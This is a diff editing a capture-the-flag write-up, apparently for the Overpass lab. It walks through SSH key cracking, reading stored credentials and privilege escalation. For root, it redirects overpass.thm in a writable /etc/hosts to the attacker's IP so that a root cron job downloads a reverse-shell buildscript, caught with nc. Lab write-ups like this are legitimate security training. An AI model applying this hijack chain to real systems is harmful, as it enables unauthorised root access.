@@ -8,12 +8,13 @@
 
 ## Enumeration
 
-- Nmap Initial
+### Nmap
 
 1. 22/ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
 2. 80/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
 
-- check http
+### HTTP
+
 - download buildscript.sh and overpass.go files.
 - analyse overpass.go file
 
@@ -83,6 +84,8 @@ $ john forjohn
 $ ssh james@$IP -i id_rsa
 ```
 
+## User Access
+
 - can enter as james user
 - `sudo -l` -> password `james13` is not correct
 - found .overpass file in his folder
@@ -97,7 +100,7 @@ $ ssh james@$IP -i id_rsa
 [{ "name": "System", "pass": "saydrawnlyingpicture" }]
 ```
 
-- there is no username System. Try to change user from `/etc/passwd` file
+- there is no username System. 
 - it is james' password
 - try to run linpeas
 - Interesting outputs
@@ -113,10 +116,13 @@ $ ssh james@$IP -i id_rsa
 james@overpass-prod:/tmp$ ls -la /etc/hosts
 -rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
 ```
+> It means root user is getting file from overpass.thm/downloads/src/buildscript.sh and run bash and the /etc/hosts file is editable 
+
+## Root Access
 
 - can I make a server like this directory and put reverse shell to buildscript.sh in my own server
-- change my IP to overpass.thm in /etc/hosts file as it has rw access
-- In my machine,
+
+- In local machine,
 
 ```sh
 $ mkdir -p downloads/src/
@@ -137,12 +143,11 @@ python -m http.server 80
 
 - listen with nc at 4242
 - then change `/etc/hosts` file in victim machine
-- original `/etc/hosts` -> `127.0.0.1 overpass.thm`
+- original `/etc/hosts` -> `127.0.0.1 overpass.thm` to `10.11.8.57 overpass.thm`
 
-```
-10.11.8.57 overpass.thm
-```
 
 ![](images/2023-03-02-23-05-10.png)
+
+- get root access
 
 ---
